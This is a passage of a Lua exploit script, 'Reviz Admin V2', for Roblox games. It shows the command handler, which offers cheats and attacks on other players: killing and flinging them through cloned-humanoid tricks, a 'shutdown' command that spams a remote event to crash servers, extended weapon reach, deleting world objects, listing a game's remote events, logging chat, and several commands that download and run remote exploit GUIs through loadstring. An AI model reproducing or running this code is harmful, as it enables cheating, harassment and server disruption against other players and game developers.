        end
        if string.sub(CMDBAR.Text, 1, 9) == ("blockhead") then
            lplayer.Character.Head.Mesh:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("sit") then
            lplayer.Character.Humanoid.Sit = true
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("bringobj ") then
            local function bringobjw()
            for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
            if obj.Name == (string.sub(CMDBAR.Text, 10)) then
            obj.CFrame = lplayer.Character.HumanoidRootPart.CFrame
            obj.CanCollide = false
            obj.Transparency = 0.7
            wait()
            obj.CFrame = lplayer.Character["Left Leg"].CFrame
            wait()
            obj.CFrame = lplayer.Character["Right Leg"].CFrame
            wait()
            obj.CFrame = lplayer.Character["Head"].CFrame
            end
            end
            end
            while wait() do
                bringobjw()
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BringObj";
            Text = "BringObj enabled.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("wsvis ") then
            vis = (string.sub(CMDBAR.Text, 7))
            local a = game:GetService("Workspace"):GetDescendants()
            for i = 1, #a do
                if a[i].className == "Part" then
                    a[i].Transparency = vis
                elseif a[i].className == "Model" then
                    local r = a[i]:getChildren()
                    for i = 1, #r do
                        if r[i].className == "Part" then
                        r[i].Transparency = vis
                        end
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("hypertotal") then
            loadstring(game:GetObjects("rbxassetid://1255063809")[1].Source)()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "HyperTotal GUI Loaded!";
            })
        end
        if string.sub(CMDBAR.Text, 1, 4) == ("cmds") then
            CMDSFRAME.Visible = true
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("rmeshhats") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                    v.Handle.Mesh:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("blockhats") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                    v.Handle.Mesh:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("rmeshtool") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Tool")) then
                    v.Handle.Mesh:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("blocktool") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Tool")) then
                    v.Handle.Mesh:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("spinner") then
            local p = Instance.new("RocketPropulsion")
            p.Parent = lplayer.Character.HumanoidRootPart
            p.Name = "Spinner"
            p.Target = lplayer.Character["Left Arm"]
            p:Fire()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Spinner enabled";
            Text = "Type ;nospinner to disable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("nospinner") then
            lplayer.Character.HumanoidRootPart.Spinner:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("reachd") then
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
                if v:isA("Tool") then
                    local a = Instance.new("SelectionBox",v.Handle)
                    a.Adornee = v.Handle
                    v.Handle.Size = Vector3.new(0.5,0.5,60)
                    v.GripPos = Vector3.new(0,0,0)
                    lplayer.Character.Humanoid:UnequipTools()
                end
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Reach applied!";
            Text = "Applied to equipped sword. Use ;noreach to disable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("reach ") then
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
                if v:isA("Tool") then
                    local a = Instance.new("SelectionBox",v.Handle)
                    a.Name = "Reach"
                    a.Adornee = v.Handle
                    v.Handle.Size = Vector3.new(0.5,0.5,(string.sub(CMDBAR.Text, 7)))
                    v.GripPos = Vector3.new(0,0,0)
                    lplayer.Character.Humanoid:UnequipTools()
                end
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Reach applied!";
            Text = "Applied to equipped sword. Use ;noreach to disable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("noreach") then
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
                if v:isA("Tool") then
                    v.Handle.Reach:Destroy()
                end
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Reach removed!";
            Text = "Removed reach from equipped sword.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("rkill ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7)))do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                wait(0.1)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.5)
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("tp me ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("cbring ") then
            if (string.sub(CMDBAR.Text, 8)) == "all" or (string.sub(CMDBAR.Text, 8)) == "All" or (string.sub(CMDBAR.Text, 8)) == "ALL" then
                cbringall = true
            else
                for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                    brplr = v.Name
                end
            end
            cbring = true
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("uncbring") then
            cbring = false
            cbringall = false
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("swap ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                local NOWPLR = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                local NOW = lplayer.Character.HumanoidRootPart.CFrame
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                local function tp(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1:MoveTo(char2.Head.Position)
                end
                end
                wait(0.1)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.5)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
                wait(0.6)
                tp(lplayer, game:GetService("Players")[v.Name])
                wait(0.4)
                lplayer.Character.HumanoidRootPart.CFrame = NOWPLR
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("glitch ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                wait(0.3)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                wait(0.4)
                b = Instance.new("BodyForce")
                b.Parent = lplayer.Character.HumanoidRootPart
                b.Name = "Glitch"
                b.Force = Vector3.new(100000000,5000,0)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unglitch") then
            lplayer.Character.HumanoidRootPart.Glitch:Destroy()
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(10000,0,10000)
            b = Instance.new("BodyForce")
            b.Parent = lplayer.Character.HumanoidRootPart
            b.Name = "unGlitch"
            b.Force = Vector3.new(0,-5000000,0)
            wait(2)
            lplayer.Character.HumanoidRootPart.unGlitch:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("grespawn") then
            lplayer.Character.Humanoid.Health = 0
            wait(1)
            lplayer.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
            lplayer.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("explorer") then
            loadstring(game:GetObjects("rbxassetid://492005721")[1].Source)()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "DEX Explorer has loaded.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("anim ") then
            local Anim = Instance.new("Animation")
            Anim.AnimationId = "rbxassetid://"..(string.sub(CMDBAR.Text, 6))
            local track = lplayer.Character.Humanoid:LoadAnimation(Anim)
            track:Play(.1, 1, 1)
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("animgui") then
            loadstring(game:GetObjects("rbxassetid://1202558084")[1].Source)()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "Energize Animations GUI has loaded.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("savepos") then
            saved = lplayer.Character.HumanoidRootPart.CFrame
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Position Saved";
            Text = "Use ;loadpos to return to saved position.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("loadpos") then
            lplayer.Character.HumanoidRootPart.CFrame = saved
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("bang ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                local Anim2 = Instance.new("Animation")
                Anim2.AnimationId = "rbxassetid://148840371"
                local track2 = lplayer.Character.Humanoid:LoadAnimation(Anim2)
                track2:Play(.1, 1, 1)
                bplrr = v.Name
                banpl = true
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("unbang") then
            banpl = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("bringmod ") then
            local function bringmodw()
            for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
            if obj.Name == (string.sub(CMDBAR.Text, 10)) then
            for i,ch in pairs(obj:GetDescendants()) do
            if (ch:IsA("BasePart")) then
            ch.CFrame = lplayer.Character.HumanoidRootPart.CFrame
            ch.CanCollide = false
            ch.Transparency = 0.7
            wait()
            ch.CFrame = lplayer.Character["Left Leg"].CFrame
            wait()
            ch.CFrame = lplayer.Character["Right Leg"].CFrame
            wait()
            ch.CFrame = lplayer.Character["Head"].CFrame
            end
            end
            end
            end
            end
            while wait() do
                bringmodw()
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BringMod";
            Text = "BringMod enabled.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("respawn") then
            local mod = Instance.new('Model', workspace) mod.Name = 're '..lplayer.Name
            local hum = Instance.new('Humanoid', mod)
            local ins = Instance.new('Part', mod) ins.Name = 'Torso' ins.CanCollide = false ins.Transparency = 1
            lplayer.Character = mod
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("shutdown") then
            game:GetService'RunService'.Stepped:Connect(function()
            pcall(function()
                for i,v in pairs(game:GetService'Players':GetPlayers()) do
                    if v.Character ~= nil and v.Character:FindFirstChild'Head' then
                        for _,x in pairs(v.Character.Head:GetChildren()) do
                            if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true) end
                        end
                    end
                end
            end)
            end)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Attempting Shutdown";
            Text = "Shutdown Attempt has begun.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("delobj ") then
            objtodel = (string.sub(CMDBAR.Text, 8))
            for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
                if v.Name == objtodel then
                    v:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("getplrs") then
            for i,v in pairs(game:GetService("Players"):GetPlayers())do
                print(v)
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Printed";
            Text = "Players have been printed to console. (F9)";
            })
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("deldecal") then
            for i,v in pairs(game:GetService("Workspace"):GetDescendants())do
                if (v:IsA("Decal")) then
                    v:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("opfinality") then
            loadstring(game:GetObjects("rbxassetid://1294358929")[1].Source)()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "OpFinality GUI has loaded.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("remotes") then
            remotes = true
            added = true
            game.DescendantAdded:connect(function(rmt)
            if added == true then
            if remotes == true then
            if rmt:IsA("RemoteEvent") then
            print("A RemoteEvent was added!")
            print(" game." .. rmt:GetFullName() .. " | RemoteEvent")
            print(" game." .. rmt:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
            end end end
            end)
            game.DescendantAdded:connect(function(rmtfnctn)
            if added == true then
            if remotes == true then
            if rmtfnctn:IsA("RemoteFunction") then
            warn("A RemoteFunction was added!")
            warn(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction")
            print(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
            end end end
            end)
           
            game.DescendantAdded:connect(function(bndfnctn)
            if added == true then
            if binds == true then
            if bndfnctn:IsA("BindableFunction") then
            print("A BindableFunction was added!")
            print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction")
            print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
            end end end
            end)
           
            game.DescendantAdded:connect(function(bnd)
            if added == true then
            if binds == true then
            if bnd:IsA("BindableEvent") then
            warn("A BindableEvent was added!")
            warn(" game." .. bnd:GetFullName() .. " | BindableEvent")
            print(" game." .. bnd:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
            end end end
            end)
           
           
            if binds == true then
            for i,v in pairs(game:GetDescendants()) do
            if v:IsA("BindableFunction") then
            print(" game." .. v:GetFullName() .. " | BindableFunction")
            print(" game." .. v:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
            end end
            for i,v in pairs(game:GetDescendants()) do
            if v:IsA("BindableEvent") then
            warn(" game." .. v:GetFullName() .. " | BindableEvent")
            print(" game." .. v:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
            end end
            else
            print("Off")
            end
            if remotes == true then
            for i,v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteFunction") then
            warn(" game." .. v:GetFullName() .. " | RemoteFunction")
            print(" game." .. v:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
            end end
            wait()
            for i,v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") then
            print(" game." .. v:GetFullName() .. " | RemoteEvent")
            print(" game." .. v:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
            end end
            else
            print("Off")
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Printing Remotes";
            Text = "Type ;noremotes to disable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("noremotes") then
            remotes = false
            added = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Printing Remotes Disabled";
            Text = "Type ;remotes to enable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("tpdefault") then
            spin = false
            followed = false
            traill = false
            noclip = false
            annoying = false
            hwalk = false
            cbringing = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("stopsit") then
            stopsitting = true
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("gosit") then
            stopsitting = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("version") then
            print(adminversion)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Version";
            Text = adminversion;
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("clicktp") then
            clickgoto = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Click TP";
            Text = "Press E to teleport to mouse position";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("noclicktp") then
            clickgoto = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Click TP";
            Text = "Click TP has been disabled.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("toolson") then
            gettingtools = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools Enabled";
            Text = "Automatically colleting tools dropped.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("toolsoff") then
            gettingtools = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools Disabled";
            Text = "Click TP has been disabled.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("delcmdbar") then
            ScreenGui:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("reset") then
            lplayer.Character.Head:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("state ") then
            statechosen = string.sub(CMDBAR.Text, 7)
            changingstate = true
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("gravity ") then
            game:GetService("Workspace").Gravity = string.sub(CMDBAR.Text, 9)
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("looprhats") then
        removingmeshhats = true
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("unlooprhats") then
            removingmeshhats = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("looprtool") then
            removingmeshtool = true
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("unlooprtool") then
            removingmeshtool = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("givetool ") then
            for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
                if v:IsA("Tool") then
                    for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
                        v.Parent = player.Character
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 4) == ("age ") then
            for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 5))) do
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account Age: "..player.AccountAge.." days!", "All")
            end
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("id ") then
            for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 4))) do
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account ID: "..player.UserId, "All")
            end
        end
        if string.sub(CMDBAR.Text, 1, 5) == (".age ") then
            for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = player.AccountAge.." Days";
                Text = "Account age of "..player.Name;
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 4) == (".id ") then
            for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 5))) do
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = player.UserId.." ID";
                Text = "Account ID of "..player.Name;
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("gameid") then
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Game ID";
            Text = "Game ID: ".. game.GameId;
            })
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("pgs") then
            local pgscheck = game:GetService("Workspace"):PGSIsEnabled()
            if pgscheck == true then
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "PGSPhysicsSolverEnabled";
                Text = "PGS is Enabled!";
                })
            else
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "PGSPhysicsSolverEnabled";
                Text = "PGS is Disabled!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("removeinvis") then
            for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
                if v:IsA("Part") then
                    if v.Transparency == 1 then
                        if v.Name ~= "HumanoidRootPart" then
                            v:Destroy()
                        end
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("removefog") then
            game:GetService("Lighting").FogStart = 0
            game:GetService("Lighting").FogEnd = 9999999999999
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("disable") then
            lplayer.Character.Humanoid.Parent = lplayer
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("enable") then
            lplayer.Humanoid.Parent = lplayer.Character
        end
        if string.sub(CMDBAR.Text, 1, 13) == ("givealltools ") then
            for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetDescendants()) do
                if v:IsA("Tool") then
                    v.Parent = lplayer.Character
                    wait()
                    for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 14))) do
                        v.Parent = player.Character
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("flyspeed ") then
            speedfly = string.sub(CMDBAR.Text, 10)
            wait()
            change()
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("carpet ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                local Anim3 = Instance.new("Animation")
                Anim3.AnimationId = "rbxassetid://282574440"
                local track3 = lplayer.Character.Humanoid:LoadAnimation(Anim3)
                track3:Play(.1, 1, 1)
                bplrr = v.Name
                banpl = true
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("uncarpet") then
            banpl = false
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("stare ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                staring = true
                stareplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unstare") then
            staring = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("logchat") then
            chatlogs = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "LogChat enabled";
            Text = "Now logging all player chat.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("unlogchat") then
            chatlogs = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "LogChat disabled";
            Text = "Stopped logging all player chat.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("fixcam") then
            game:GetService("Workspace").CurrentCamera:Destroy()
            wait(0.1)
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
            game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
            lplayer.CameraMinZoomDistance = 0.5
            lplayer.CameraMaxZoomDistance = 400
            lplayer.CameraMode = "Classic"
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unstate") then
            changingstate = false
        end
        CMDBAR.Text = ""
    end
end)
 
wait(0.3)
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Loaded successfully!";
    Text = "Reviz Admin V2 by illremember";
})
wait(0.1)
print("Reviz Admin V2 loaded!")
if game:GetService("Workspace").FilteringEnabled == true then
    warn("FE is Enabled (Filtering Enabled)")
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "FE is Enabled";
        Text = "Filtering Enabled. Enjoy using Reviz Admin!";
    })
else
    warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "FE is Disabled";
        Text = "Filtering Disabled. Consider using a different admin script.";
    })
end
 
local intro = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
intro.Parent = game:GetService("CoreGui")
Frame.Parent = intro
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.BackgroundTransparency = 1
Frame.Size = UDim2.new(1, 0, 0, 300)
Frame.Position = UDim2.new(0, 0, -0.4, 0)
ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BackgroundTransparency = 1
ImageLabel.Position = UDim2.new(0, 0, 0, 0)
ImageLabel.Size = UDim2.new(1, 0, 1, 0)
ImageLabel.Image = "http://www.roblox.com/asset/?id=1542162618"
Frame:TweenPosition(UDim2.new(0, 0, 0.2, 0), "Out", "Elastic", 3)
wait(3.01)
Frame:TweenPosition(UDim2.new(0, 0, 1.5, 0), "Out", "Elastic", 5)
wait(5.01)
intro:Destroy()
end)